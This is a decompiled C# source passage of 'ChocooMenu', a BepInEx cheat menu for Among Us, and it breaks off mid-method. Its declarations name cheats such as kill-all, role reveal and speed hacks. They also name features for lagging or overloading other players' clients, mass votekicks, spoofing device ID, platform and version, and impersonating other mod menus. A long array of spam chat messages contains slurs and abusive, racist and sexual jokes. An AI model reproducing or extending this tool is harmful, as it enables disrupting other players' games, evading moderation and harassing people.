// Decompiled with JetBrains decompiler
// Type: chocoomenu.ChocooPlugin
// Assembly: Area51files, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 00A892C3-13C3-404B-9CB9-1FDCB50BD8FF
// Assembly location: C:\Users\Administrator\Desktop\Among us Mod menus\ChocooMenu v1.0.8_dev2.dll

using AmongUs.Data;
using AmongUs.Data.Player;
using AmongUs.GameOptions;
using BepInEx;
using BepInEx.Configuration;
using BepInEx.Logging;
using BepInEx.Unity.IL2CPP;
using BepInEx.Unity.IL2CPP.Utils;
using HarmonyLib;
using Hazel;
using Il2CppInterop.Runtime.Attributes;
using Il2CppInterop.Runtime.Injection;
using Il2CppInterop.Runtime.InteropTypes.Arrays;
using Il2CppSystem;
using Il2CppSystem.Collections.Generic;
using Il2CppSystem.Reflection;
using InnerNet;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading;
using TMPro;
using UnityEngine;
using UnityEngine.Analytics;
using UnityEngine.UI;
using X;

#nullable disable
namespace chocoomenu;

[BepInPlugin("com.chocoo.menu", "chocoomenu", "1.0.8")]
[BepInProcess("Among Us.exe")]
public class ChocooPlugin : BasePlugin
{
  public const string PluginGuid = "com.chocoo.menu";
  public const string PluginName = "chocoomenu";
  public const string PluginVersion = "1.0.8";
  public static bool ShowMenu = false;
  public static int CachedGameId = 0;
  private static float _moveSelfTimer = 0.0f;
  public static bool AutoRejoinEnabled = false;
  public static bool IsScanning = false;
  public static bool AnimShieldsEnabled = false;
  public static bool AnimAsteroidsEnabled = false;
  public static bool AnimEmptyGarbageEnabled = false;
  public static bool AnimCamsInUseEnabled = false;
  public static float GameSpeed = 1f;
  public static float PlayerSpeed = 1f;
  public static bool SpeedHackEnabled = false;
  public static string ActiveTab = "About";
  public static bool ShowForceRolesMenu = false;
  public static Dictionary<int, RoleTypes> forcedRoles = new Dictionary<int, RoleTypes>();
  public static int selectedForceRolePlayerId = -1;
  public static RoleTypes selectedRoleType = (RoleTypes) 0;
  public static bool showRoleDropdown = false;
  public static int dropdownPlayerIndex = -1;
  public static bool FindDatersEnabled = false;
  public static bool ExtendedLobbyEnabled = false;
  public static bool ShowLevelSpoof = false;
  public static bool ShowPlatformSpoof = false;
  public static int SelectedPlatformIndex = 0;
  public static bool BypassPlatformDetectionEnabled = false;
  public static readonly string[] PlatformNames = new string[14]
  {
    "None (Real)",
    "Epic Games",
    "Steam",
    "Mac",
    "MS Store",
    "Itch io",
    "iOS/iPad OS",
    "Android",
    "Switch",
    "Xbox",
    "Playstation",
    "Starlight",
    "Unknown",
    "Custom"
  };
  public static readonly string[] PlatformEnumNames = new string[14]
  {
    "",
    "StandaloneEpicPC",
    "StandaloneSteamPC",
    "StandaloneMac",
    "StandaloneWin10",
    "StandaloneItch",
    "IPhone",
    "Android",
    "Switch",
    "Xbox",
    "Playstation",
    "Starlight",
    "Unknown",
    "Custom"
  };
  public static bool SpoofDeviceIdEnabled = true;
  private static string spoofedDeviceId = (string) null;
  public static bool SpoofGameVersionEnabled = false;
  public static int SpoofedGameVersion = Constants.GetBroadcastVersion();
  public static bool UseModdedProtocol = false;
  public static readonly Dictionary<string, int> GameVersions = new Dictionary<string, int>()
  {
    {
      "Current Version",
      Constants.GetBroadcastVersion()
    },
    {
      "v17.2.1",
      50652900
    },
    {
      "v17.2.0",
      50645050
    },
    {
      "v17.1.2",
      50647000
    },
    {
      "v17.1.0",
      50643450
    },
    {
      "v16.1.0",
      50632950
    }
  };
  public static int SelectedVersionIndex = 0;
  public const byte MENU_RPC_ID = 121;
  public const byte TUFFMENU_RPC_ID = 167;
  public const byte SICKOMENU_RPC_ID = 164;
  public const byte AMONGUSMENU_RPC_ID = 85;
  public const byte BETTERAMONGUS_RPC_ID = 150;
  public const byte KILLNETWORK_RPC_ID = 250;
  public const byte HOSTGUARD_RPC_ID = 176 /*0xB0*/;
  public const byte GOATNETCLIENT_RPC_ID = 154;
  public const byte NETMENU_RPC_ID = 162;
  public const byte BANMOD_RPC_ID = 219;
  public const byte MODMENUCREW_RPC_ID = 202;
  public const byte NJORDMENU_RPC_ID = 89;
  public const byte UNKNOWN_RPC_ID = 255 /*0xFF*/;
  public static bool SpoofMenuEnabled = false;
  public static int selectedSpoofMenuIndex = 0;
  public static readonly string[] spoofMenuNames = new string[13]
  {
    "ChocooMenu (Default)",
    "TuffMenu",
    "SickoMenu",
    "AmongUsMenu",
    "BetterAmongUs",
    "KillNetwork",
    "HostGuard",
    "GoatNetClient",
    "NetMenu",
    "BanMod",
    "ModMenuCrew",
    "NjordMenu",
    "UnknownMenu"
  };
  public static readonly byte[] spoofMenuRPCs = new byte[13]
  {
    (byte) 121,
    (byte) 167,
    (byte) 164,
    (byte) 85,
    (byte) 150,
    (byte) 250,
    (byte) 176 /*0xB0*/,
    (byte) 154,
    (byte) 162,
    (byte) 219,
    (byte) 202,
    (byte) 89,
    byte.MaxValue
  };
  public static bool ShowKillCooldown = false;
  private static HashSet<byte> vanishedPlayers = new HashSet<byte>();
  private static Dictionary<byte, ushort> _ventSeqIds = new Dictionary<byte, ushort>();
  public static bool NoClipEnabled = false;
  public static bool SpinEnabled = false;
  public static bool KillNotificationEnabled = false;
  public static bool AutoCopyCodeEnabled = false;
  public static float spinAngle = 0.0f;
  public static bool ShowPlayerInfo = false;
  public static bool KillOtherImpostersEnabled = false;
  public static bool KillAllEnabled = false;
  public static bool ShowVotekickInfo = false;
  public static bool ImpostorTasksEnabled = false;
  public static bool TeleportToCursorEnabled = false;
  public static bool MoveSelfByCursorEnabled = false;
  public static bool AlwaysShowChatEnabled = false;
  public static bool SeeGhostsEnabled = false;
  public static bool CosmeticsUnlockerEnabled = true;
  public static bool MoreLobbyInfoEnabled = false;
  public static bool AvoidPenaltiesEnabled = true;
  public static bool NoShadowsEnabled = false;
  public static bool ZoomOutEnabled = false;
  public static bool resolutionChangeNeeded = false;
  public static bool AccurateDisconnectReasonsEnabled = true;
  public static bool RevealVotesEnabled = false;
  public static bool SeeRolesEnabled = false;
  public static bool ShowHostEnabled = false;
  public static bool DarkModeEnabled = false;
  public static bool ProtectVentOverload = true;
  public static bool ProtectLadderOverload = true;
  public static bool AntiExploitsEnabled = false;
  public static bool ProtectStartCounterOverload = true;
  public static bool KeepProtectingAllEnabled = false;
  public static bool SeeProtectionsEnabled = false;
  public static bool SeePhantomsEnabled = false;
  private static Dictionary<PlayerControl, TextMeshPro> voteKickBadges = new Dictionary<PlayerControl, TextMeshPro>();
  public static bool SeePlayersInVentsEnabled = false;
  public static bool UnlockVentsEnabled = false;
  public static bool NoSeekerAnimEnabled = false;
  public static bool NoShhScreenEnabled = false;
  public static bool BypassVisualTasksEnabled = false;
  public static bool DisableVentingEnabled = false;
  public static bool AutoKillEnabled = false;
  public static bool DisableKillAnimationEnabled = false;
  public static bool InvisibilityEnabled = false;
  private static float lastProtectTime = 0.0f;
  private static float lastGodModeProtectTime = 0.0f;
  public static bool CustomButtonColorEnabled = true;
  private static readonly Color customButtonColor = new Color(0.390471f, 0.770941f, 0.972824f, 1f);
  public static bool ShowMenuOnStartup = false;
  public static bool DisableCustomTheme = false;
  public static bool MoveMenuToCursor = false;
  public static bool DisableAnimations = false;
  public static bool ShowVotekickCounter = false;
  public static bool AntiBlackoutEnabled = false;
  public static bool BecomeImmortalEnabled = false;
  private static bool lastImmortalState = false;
  private const int IMMORTAL_VENT_ID = 50;
  public static bool ReduceChatCooldownEnabled = false;
  public static bool AllowCtrlCVEnabled = false;
  public static bool BypassURLBlockEnabled = false;
  public static bool AllowAllCharactersEnabled = true;
  public static bool ExtendChatLimitEnabled = false;
  public static bool ExtendChatHistoryEnabled = true;
  public static bool DisableTelemetryEnabled = true;
  private static float currentMeetingStartTime = 0.0f;
  private static float currentMeetingEndTime = 0.0f;
  private static bool isMeetingActive = false;
  private static float votingCompleteTime = 0.0f;
  private static bool votingHasCompleted = false;
  private static HashSet<byte> shapeshiftedBeforeMeeting = new HashSet<byte>();
  public static PlayerControl selectedShapeshiftTarget = (PlayerControl) null;
  public static int selectedShapeshiftTargetId = -1;
  public static bool showShapeshiftTargetDropdown = false;
  private static Dictionary<uint, PlayerControl> shapeshiftedPlayers = new Dictionary<uint, PlayerControl>();
  public static HashSet<string> blackoutedPlayers = new HashSet<string>();
  private static Dictionary<string, float> blackoutTimestamps = new Dictionary<string, float>();
  private const float BLACKOUT_DETECTION_WINDOW = 2f;
  public static float MenuOpacity = 1f;
  public static int MenuFontSize = 12;
  public static int SpoofedLevel = 0;
  public static string SpoofedPlatform = "";
  public static bool SeeModUsersEnabled = true;
  public static Dictionary<byte, byte> detectedModUsers = new Dictionary<byte, byte>();
  private static Dictionary<byte, float> lastDetectionTime = new Dictionary<byte, float>();
  private const float DETECTION_COOLDOWN = 2f;
  private static HashSet<byte> detectedMMCUsers = new HashSet<byte>();
  private static float lastMMCHandshakeTime = 0.0f;
  private const float MMC_HANDSHAKE_INTERVAL = 5f;
  private static Dictionary<string, Sprite> spriteCache = new Dictionary<string, Sprite>();
  public static bool SetFakeRoleEnabled = false;
  public static RoleTypes SelectedFakeRole = (RoleTypes) 0;
  public static RoleTypes? OriginalRole = new RoleTypes?();
  private static bool fakeRoleDropdownOpen = false;
  private static Vector2 fakeRoleScrollPos = Vector2.zero;
  public static bool EndlessVentTime = false;
  public static bool NoVentCooldown = false;
  public static bool NoVitalsCooldown = false;
  public static bool EndlessBattery = false;
  public static bool NoTrackingCooldown = false;
  public static bool NoTrackingDelay = false;
  public static bool EndlessTracking = false;
  public static bool EndlessShapeshiftDuration = false;
  public static bool NoShapeshiftAnimation = false;
  public static bool UnlimitedKillRange = false;
  public static bool UnlimitedInterrogateRange = false;
  public const byte CHOCOOMENU_RPC_ID = 121;
  public static readonly string[] spoofMenuDiscordMessages = new string[13]
  {
    "ChocooMenu v1.0.8",
    "TuffMenu",
    "SickoMenu",
    "AmongUsMenu",
    "BetterAmongUs",
    "KillNetwork Mode v3.0",
    "HostGuard",
    "GoatNetClient",
    "NetMenu",
    "BanMod",
    "ModMenuCrew v2.1",
    "NjordMenu",
    "UnknownMenu"
  };
  public static bool StealthMode = false;
  private static float lastIdentificationRpcTime = 0.0f;
  private static float identificationRpcInterval = 10f;
  public static bool RGBMode = false;
  private static float rgbHue = 0.0f;
  private static float breatheIntensity = 1f;
  private static bool breatheIncreasing = false;
  private static float currentHueTarget = 0.0f;
  private static bool colorLocked = false;
  private static Color _cachedRGBColor = new Color(0.1f, 0.1f, 0.1f, 0.95f);
  private static Color _cachedRGBAccent = new Color(0.15f, 0.15f, 0.2f, 1f);
  private static Color _cachedRGBText = Color.white;
  public static bool RandomizeOutfit = false;
  public static float nextRandomTime = 0.0f;
  public static bool DisableVotekicks = false;
  public static bool DisableMeetings = false;
  public static bool GodModeEnabled = false;
  public static bool DisableSabotagesEnabled = false;
  public static bool DisableGameEndEnabled = false;
  public static bool isForcingGameEnd = false;
  public static bool TaskSpeedrunEnabled = false;
  public static float SpeedrunTimer = 0.0f;
  public static bool SpeedrunOver = false;
  public static string SpeedrunLastResult = "";
  public static bool ShowLobbyTimerEnabled = true;
  public static bool ShowForceColorMenu = false;
  public static Dictionary<int, byte> forcedColors = new Dictionary<int, byte>();
  public static int selectedForceColorId = 0;
  public static bool showColorDropdown = false;
  public static int dropdownPlayerIndexColor = -1;
  public static byte selectedGlobalColor = 0;
  public static bool SpamRepairSabotages = false;
  public static bool reactorActive = false;
  public static bool oxygenActive = false;
  public static bool commsActive = false;
  public static bool lightsActive = false;
  public static bool unfixableLightsActive = false;
  public static bool AnticheatEnabled = false;
  public static bool AutoBanEnabled = false;
  public static bool CheckAbnormalColorChange = true;
  public static bool CheckAbnormalCosmeticChange = true;
  public static bool CheckAbnormalPlatforms = true;
  public static bool CheckAbnormalTaskCompletion = true;
  public static bool CheckAbnormalMurder = true;
  public static bool CheckAbnormalLevel = true;
  public static bool CheckAbnormalProtect = true;
  public static bool CheckAbnormalShapeshift = true;
  public static bool CheckAbnormalVanish = true;
  public static bool CheckAbnormalVenting = true;
  public static bool CheckAbnormalReportMeeting = true;
  public static bool CheckAbnormalSabotage = true;
  public static bool CheckAbnormalVotekickSpam = true;
  public static uint MaxAllowedLevel = 10000;
  public static int totalDetections = 0;
  public static List<string> detectionLog = new List<string>();
  public static HashSet<string> BlacklistedCodes = new HashSet<string>();
  public static HashSet<string> notifiedBlacklistedPlayers = new HashSet<string>();
  public static HashSet<string> notifiedAbnormalPlatformPlayers = new HashSet<string>();
  public static HashSet<string> notifiedAbnormalLevelPlayers = new HashSet<string>();
  public static string blacklistFolderPath = "";
  public static bool BanBlacklistedEnabled = false;
  public static bool OverloadEnabled = false;
  public static bool TargetedOverloadTrigger = false;
  public static bool TargetedOverloadEnabled = false;
  private static float lastMethod3OverloadTime = 0.0f;
  public static bool BreakCounterEnabled = false;
  public static int selectedTargetId = -1;
  public static int targetedOverloadMethod = 2;
  public static bool OverloadMethod8Enabled = false;
  public static int OverloadMethod2Delay = 0;
  public static int _overloadMethod2Batch = 0;
  public static bool OverloadMethod3Enabled = false;
  public static bool LagEveryoneEnabled = false;
  public static bool OverflowMethod1Enabled = false;
  public static bool OverflowMethod2Enabled = false;
  public static bool OverflowMethod3Enabled = false;
  public static bool OverflowMethod4Enabled = false;
  public static bool OverflowMethod5Enabled = false;
  public static bool OverflowMethod6Enabled = false;
  public static bool OverflowMethod7Enabled = false;
  public static bool OverflowMethod8Enabled = false;
  public static int selectedMapId = 0;
  public static int selectedVotekickTargetId = -1;
  public static bool VotekickAllEnabled = false;
  private static HashSet<int> votekickedPlayerIds = new HashSet<int>();
  public static bool VotekickAutoRejoinEnabled = false;
  private static int storedGameIdForRejoin = 0;
  private static float exitTimeForRejoin = -1f;
  public static int selectedHostKickTargetId = -1;
  public static ConfigEntry<KeyCode> MenuKey;
  public static bool isChangingKey = false;
  public static ManualLogSource Logger;
  public static ConfigEntry<bool> Config_ShowKillCooldown;
  public static ConfigEntry<bool> Config_NoClipEnabled;
  public static ConfigEntry<bool> Config_SpinEnabled;
  public static ConfigEntry<bool> Config_KillNotificationEnabled;
  public static ConfigEntry<bool> Config_AutoCopyCodeEnabled;
  public static ConfigEntry<bool> Config_ShowPlayerInfo;
  public static ConfigEntry<bool> Config_AntiExploitsEnabled;
  public static ConfigEntry<bool> Config_KillOtherImpostersEnabled;
  public static ConfigEntry<bool> Config_ShowVotekickInfo;
  public static ConfigEntry<bool> Config_RGBMode;
  public static ConfigEntry<bool> Config_StealthMode;
  public static ConfigEntry<bool> Config_RandomizeOutfit;
  public static ConfigEntry<bool> Config_BanBlacklistedEnabled;
  public static ConfigEntry<bool> Config_DisableVotekicks;
  public static ConfigEntry<bool> Config_DisableMeetings;
  public static ConfigEntry<bool> Config_GodModeEnabled;
  public static ConfigEntry<bool> Config_DisableSabotagesEnabled;
  public static ConfigEntry<bool> Config_DisableGameEndEnabled;
  public static ConfigEntry<bool> Config_AnticheatEnabled;
  public static ConfigEntry<bool> Config_AutoBanEnabled;
  public static ConfigEntry<bool> Config_FindDatersEnabled;
  public static ConfigEntry<bool> Config_ExtendedLobbyEnabled;
  public static ConfigEntry<bool> Config_SpamChatEnabled;
  public static ConfigEntry<bool> Config_VotekickAllEnabled;
  public static ConfigEntry<bool> Config_TeleportToCursorEnabled;
  public static ConfigEntry<bool> Config_AlwaysShowChatEnabled;
  public static ConfigEntry<bool> Config_RevealRolesEnabled;
  public static ConfigEntry<bool> Config_RevealVotesEnabled;
  public static ConfigEntry<bool> Config_ZoomOutEnabled;
  public static ConfigEntry<bool> Config_SeeGhostsEnabled;
  public static ConfigEntry<bool> Config_MoreLobbyInfoEnabled;
  public static ConfigEntry<bool> Config_ShowHostEnabled;
  public static ConfigEntry<bool> Config_SeeModUsersEnabled;
  public static ConfigEntry<bool> Config_DarkModeEnabled;
  public static ConfigEntry<bool> Config_NoShadowsEnabled;
  public static ConfigEntry<bool> Config_ShowLobbyTimerEnabled;
  public static ConfigEntry<bool> Config_SpoofMenuEnabled;
  public static ConfigEntry<int> Config_SpoofMenuIndex;
  public static ConfigEntry<bool> Config_EndlessVentTime;
  public static ConfigEntry<bool> Config_NoVentCooldown;
  public static ConfigEntry<bool> Config_NoVitalsCooldown;
  public static ConfigEntry<bool> Config_EndlessBattery;
  public static ConfigEntry<bool> Config_NoTrackingCooldown;
  public static ConfigEntry<bool> Config_NoTrackingDelay;
  public static ConfigEntry<bool> Config_EndlessTracking;
  public static ConfigEntry<bool> Config_EndlessShapeshiftDuration;
  public static ConfigEntry<bool> Config_NoShapeshiftAnimation;
  public static ConfigEntry<bool> Config_UnlimitedKillRange;
  public static ConfigEntry<bool> Config_ImpostorTasksEnabled;
  public static ConfigEntry<bool> Config_UnlimitedInterrogateRange;
  public static ConfigEntry<bool> Config_CheckAbnormalColorChange;
  public static ConfigEntry<bool> Config_CheckAbnormalCosmeticChange;
  public static ConfigEntry<bool> Config_CheckAbnormalTaskCompletion;
  public static ConfigEntry<bool> Config_CheckAbnormalMurder;
  public static ConfigEntry<bool> Config_CheckAbnormalLevel;
  public static ConfigEntry<bool> Config_CheckAbnormalProtect;
  public static ConfigEntry<bool> Config_CheckAbnormalShapeshift;
  public static ConfigEntry<bool> Config_CheckAbnormalVanish;
  public static ConfigEntry<bool> Config_CheckAbnormalPlatforms;
  public static ConfigEntry<bool> Config_CheckAbnormalVenting;
  public static ConfigEntry<bool> Config_CheckAbnormalReportMeeting;
  public static ConfigEntry<bool> Config_CheckAbnormalSabotage;
  public static ConfigEntry<bool> Config_CheckAbnormalVotekickSpam;
  public static ConfigEntry<uint> Config_MaxAllowedLevel;
  public static ConfigEntry<bool> Config_AccurateDisconnectReasonsEnabled;
  public static ConfigEntry<bool> Config_AllowAllCharactersEnabled;
  public static ConfigEntry<bool> Config_AllowCtrlCVEnabled;
  public static ConfigEntry<bool> Config_AntiBlackoutEnabled;
  public static ConfigEntry<bool> Config_AutoKillEnabled;
  public static ConfigEntry<bool> Config_AutoRejoinEnabled;
  public static ConfigEntry<bool> Config_AvoidPenaltiesEnabled;
  public static ConfigEntry<bool> Config_BecomeImmortalEnabled;
  public static ConfigEntry<bool> Config_BypassPlatformDetectionEnabled;
  public static ConfigEntry<bool> Config_BypassURLBlockEnabled;
  public static ConfigEntry<bool> Config_BypassVisualTasksEnabled;
  public static ConfigEntry<bool> Config_CosmeticsUnlockerEnabled;
  public static ConfigEntry<bool> Config_DisableAnimations;
  public static ConfigEntry<bool> Config_DisableCustomTheme;
  public static ConfigEntry<bool> Config_DisableKillAnimationEnabled;
  public static ConfigEntry<bool> Config_DisableTelemetryEnabled;
  public static ConfigEntry<bool> Config_DisableVentingEnabled;
  public static ConfigEntry<bool> Config_ExtendChatHistoryEnabled;
  public static ConfigEntry<bool> Config_ExtendChatLimitEnabled;
  public static ConfigEntry<bool> Config_KeepProtectingAllEnabled;
  public static ConfigEntry<bool> Config_MoveMenuToCursor;
  public static ConfigEntry<bool> Config_MoveSelfByCursorEnabled;
  public static ConfigEntry<bool> Config_NoSeekerAnimEnabled;
  public static ConfigEntry<bool> Config_NoShhScreenEnabled;
  public static ConfigEntry<bool> Config_ReduceChatCooldownEnabled;
  public static ConfigEntry<bool> Config_SeePhantomsEnabled;
  public static ConfigEntry<bool> Config_SeePlayersInVentsEnabled;
  public static ConfigEntry<bool> Config_SeeProtectionsEnabled;
  public static ConfigEntry<bool> Config_SeeRolesEnabled;
  public static ConfigEntry<bool> Config_SetFakeRoleEnabled;
  public static ConfigEntry<bool> Config_ShowLevelSpoof;
  public static ConfigEntry<bool> Config_ShowMenuOnStartup;
  public static ConfigEntry<bool> Config_ShowPlatformSpoof;
  public static ConfigEntry<bool> Config_ShowVotekickCounter;
  public static ConfigEntry<bool> Config_SpeedHackEnabled;
  public static ConfigEntry<int> Config_SpoofedLevel;
  public static ConfigEntry<string> Config_SpoofedPlatform;
  public static ConfigEntry<int> Config_SelectedPlatformIndex;
  public static ConfigEntry<string> Config_CustomPlatformInputText;
  public static ConfigEntry<int> Config_SelectedVersionIndex;
  public static ConfigEntry<int> Config_SpoofedGameVersion;
  public static ConfigEntry<float> Config_GameSpeed;
  public static ConfigEntry<float> Config_PlayerSpeed;
  public static ConfigEntry<bool> Config_SpoofDeviceIdEnabled;
  public static ConfigEntry<bool> Config_SpoofGameVersionEnabled;
  public static ConfigEntry<bool> Config_TaskSpeedrunEnabled;
  public static ConfigEntry<bool> Config_UnlockVentsEnabled;
  public static ConfigEntry<bool> Config_UseModdedProtocol;
  public static ConfigEntry<bool> Config_VotekickAutoRejoinEnabled;
  public static int selectedVentId = 0;
  public static string[] ventNames = new string[13]
  {
    "Admin",
    "Hallway",
    "Cafeteria",
    "Electrical",
    "Upper Engine",
    "Security",
    "Medbay",
    "Weapons",
    "Reactor (Bottom)",
    "Lower Engine",
    "Shields",
    "Reactor (Top)",
    "Navigation"
  };
  public static string[] weirdMessages = new string[124]
  {
    "I vented into your mom's room last night",
    "The Impostor is actually your dad who left to get milk 10 years ago",
    "I'm not the Impostor, I'm just your sleep paralysis demon",
    "Red sus? Nah, your search history is sus",
    "I saw Blue doing tasks... with your girlfriend",
    "Emergency meeting: Who asked?",
    "If you vote me out, you're adopted",
    "I'm the Impostor and my lawyer advised me to not finish this sentence",
    "Crewmate? More like crew-MISTAKE because you suck",
    "I'm not saying Yellow is sus, but they definitely know what happened in 1989",
    "I didn't vent, I used creative mode",
    "Guys I think the Impostor is inside the walls",
    "If being sus is a crime then call me Jeffrey Dahmer",
    "I saw the Impostor do the Macarena on a dead body in cafeteria",
    "This lobby smells like broke and it's coming from everyone except me",
    "I'm not venting, I'm just visiting my summer home in the vents",
    "Red is gayer than a rainbow in a Pride parade during gay month",
    "If you don't vote Yellow, your pillow will be warm on both sides tonight",
    "I'm the Impostor and I've been trying to reach you about your car's extended warranty",
    "POV: You're in electrical and you hear the vents start speaking Spanish",
    "Fun fact: A group of crows is called a murder, just like what I did in electrical",
    "Did you know? The average person walks past 36 murderers in their lifetime. I'm 12 of them",
    "Statistically, you're more likely to die from me than a vending machine",
    "Fun fact: Dolphins are known to grape other dolphins. Red is a dolphin",
    "The human body contains enough bones to make an entire skeleton. Wanna see?",
    "Octopi have 3 hearts. I stole all of them from my victims",
    "Fun fact: You're breathing manually now. Also I'm the Impostor",
    "Bananas are berries but strawberries aren't. Also I killed in admin",
    "A day on Venus is longer than its year. This meeting is longer than both",
    "Your tongue never sits comfortably in your mouth. Vote Yellow btw",
    "I'm not sus, you're just racist against red people",
    "Yellow was not the Impostor. But they should've been for those shoes",
    "I saw Pink kill... my faith in humanity",
    "If I'm the Impostor then why am I so good looking? Checkmate",
    "Red vented? No, he's just good at parkour",
    "This isn't a democracy, it's a dictatorship and I'm voting Blue",
    "I'm clearing Yellow. We were busy in electrical if you know what I mean",
    "Skip? No, I don't skip leg day unlike you skinny crewmates",
    "Someone called the emergency meeting just to tell us they're vegan",
    "I'm the Impostor and my pronouns are was/were because you're all dead",
    "Green is clear, we compared credit scores in admin",
    "I trust Blue less than I trust gas station sushi",
    "If you're voting on 7 you're dumber than a bag of hammers",
    "This meeting is more pointless than a screen door on a submarine",
    "I've seen better detective work from Scooby Doo on ketamine",
    "I'm not the Impostor, I just have a very particular set of skills",
    "Fun fact: You lose 1% of brain cells every time you play Among Us. You're at -50%",
    "I saw Orange fake tasks harder than my dad faked loving me",
    "This crew has the combined IQ of a participation trophy",
    "I'm voting randomly because democracy is a lie anyway",
    "Red told me he's the Impostor in Morse code using his blinks. Trust me bro",
    "If aliens are watching us play Among Us, they're not coming to Earth",
    "I'm not throwing, I'm just aggressively bad at the game",
    "This lobby is what happens when cousins marry cousins",
    "I'd rather be waterboarded at Guantanamo Bay than finish this game with you",
    "It's giving Impostor. It's giving murder. It's giving electrical body",
    "No thoughts, head empty, just vibes and murder",
    "I'm not like other Impostors, I'm worse",
    "Main character energy but the character is the Impostor",
    "I didn't come here to make friends, I came here to commit vehicular manslaughter",
    "That's not very cash money of you to vote me",
    "I'm baby. I'm baby Impostor. I can't go to jail",
    "This is my villain origin story and you're all extras",
    "I'm not saying I'm Batman, but have you ever seen me and Batman in the same room?",
    "I have the moral backbone of a chocolate eclair but I'm not the Impostor",
    "Your gameplay is what birth control commercials are based on",
    "I've seen more intelligence in a jar of mayonnaise",
    "You play Among Us like you're trying to speedrun unemployment",
    "Your detective skills are on par with Helen Keller playing Where's Waldo",
    "I'd call you a clown but that's an insult to circus performers",
    "You're the human equivalent of a participation award",
    "Your IQ is lower than your credit score and that's saying something",
    "You have the awareness of a blind kid in a dark room looking for a black cat that isn't there",
    "I'm not saying you're dumb, but you make a rock look like Einstein",
    "Your brain is smoother than a marble floor covered in butter",
    "I declare bankruptcy! Oh wait wrong game. Still voting Blue tho",
    "According to my calculations, which are never wrong, Yellow is the Impostor. I can't do math",
    "I'm using my woman's intuition and it says Red. I'm a man btw",
    "My ancestors are smiling at me Imperials, can you say the same? Vote Purple",
    "I had a vision from God and he said skip",
    "I asked my Magic 8 Ball and it said Orange is sus",
    "The voices in my head are saying it's Green. The voices are never wrong except always",
    "I'm voting based on astrology. Mercury is in retrograde so it's Yellow",
    "My therapist says I need to work on trust issues so I'm trusting no one. Vote everyone",
    "I consulted the Elder Scrolls and they said Brown is the Impostor",
    "This joke has been beaten more than my dad beat me. Vote Red",
    "I'm running out of creative insults so just vote randomly",
    "This is my 47th game today. I have no life. Also Blue is sus",
    "I should be studying for my exam tomorrow but instead I'm here. Worth it. Skip",
    "My parents are disappointed in me and they're right. Vote Yellow",
    "I haven't touched grass in 3 weeks and it shows in my gameplay",
    "I'm addicted to Among Us like it's 2020. Someone help me. Vote Purple",
    "This game is proof that democracy doesn't work",
    "I've spent more time in electrical than I have with my family",
    "My social skills peaked in 2019 and it's all downhill from here",
    "I haven't seen this much chaos since the French Revolution. Vote everyone",
    "This is like the Salem Witch Trials but with worse evidence",
    "We're witch hunting harder than McCarthy in the 1950s",
    "This meeting has more drama than the fall of Rome",
    "I trust this crew as much as Julius Caesar trusted the Senate",
    "We're making decisions like it's the Nuremberg Trials but dumber",
    "This is giving Trail of Tears energy and I don't like it",
    "I've seen better teamwork from the Donner Party",
    "This lobby is like the Titanic: full of bad decisions and about to sink",
    "We're fumbling harder than the French at Waterloo",
    "I'm the Walter White of Among Us. I am the danger. I am the one who knocks. Vote Blue",
    "It's Britney, b*tch. And Britney says Yellow is the Impostor",
    "I'm too hot (hot damn) to be the Impostor. Make a dragon wanna retire man",
    "I'm just Ken and I killed in Barbie Land",
    "Oppenheimer didn't feel this bad about mass destruction. Vote Pink",
    "I'm having a Joker moment and society is to blame. Also I vented",
    "What would Scooby Doo? He'd vote Orange and he'd be right",
    "I'm Batman. The Dark Knight. The Impostor. Wait, I mean I'm not the Impostor",
    "I'm lactose intolerant but I'm tolerating this BS even less. Vote someone",
    "This game is more rigged than a carnival game. Skip",
    "I have trust issues and daddy issues. Mostly daddy issues. Vote Red because he looks like my dad",
    "My standards are low but holy f*ck. Vote everyone",
    "I'm not drunk but I wish I was. Yellow sus",
    "This lobby is more toxic than Chernobyl",
    "I've seen better organization from a monkey knife fight",
    "If stupidity was a superpower, this crew would be the Avengers",
    "I'm going to vote and then cry myself to sleep. Standard Tuesday",
    "This game makes me want to uninstall life",
    "I have the emotional stability of a Jenga tower in an earthquake"
  };
  public static int coloredChatIndex = 0;

  public static Sprite LoadSpriteFromEmbedded(string resourcePath, float pixelsPerUnit = 100f)
  {
    try
    {
      if (ChocooPlugin.spriteCache.ContainsKey(resourcePath))
        return ChocooPlugin.spriteCache[resourcePath];
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(resourcePath);
      if (manifestResourceStream == null)
      {
        foreach (string manifestResourceName in executingAssembly.GetManifestResourceNames())
          ;
        return (Sprite) null;
      }
      byte[] array;
      using (MemoryStream destination = new MemoryStream())
      {
        manifestResourceStream.CopyTo((Stream) destination);
        array = destination.ToArray();
      }
      manifestResourceStream.Close();
      Texture2D texture2D = new Texture2D(2, 2, (TextureFormat) 4, false);
      if (!ImageConversion.LoadImage(texture2D, Il2CppStructArray<byte>.op_Implicit(array)))
        return (Sprite) null;
      Sprite sprite = Sprite.Create(texture2D, new Rect(0.0f, 0.0f, (float) ((Texture) texture2D).width, (float) ((Texture) texture2D).height), new Vector2(0.5f, 0.5f), pixelsPerUnit);
      ((Object) sprite).hideFlags = (HideFlags) 61;
      ChocooPlugin.spriteCache[resourcePath] = sprite;
      return sprite;
    }
    catch (Exception ex)
    {
      return (Sprite) null;
    }
  }

  public static bool IsHostOnlyRPC(byte callId)
  {
    return callId == (byte) 22 || callId == (byte) 29 || callId == (byte) 61;
  }

  public static bool IsCosmeticRPC(byte callId)
  {
    return callId == (byte) 8 || callId == (byte) 9 || callId == (byte) 10 || callId == (byte) 17 || callId == (byte) 36 || callId == (byte) 37;
  }

  public static bool IsGameplayRPC(byte callId)
  {
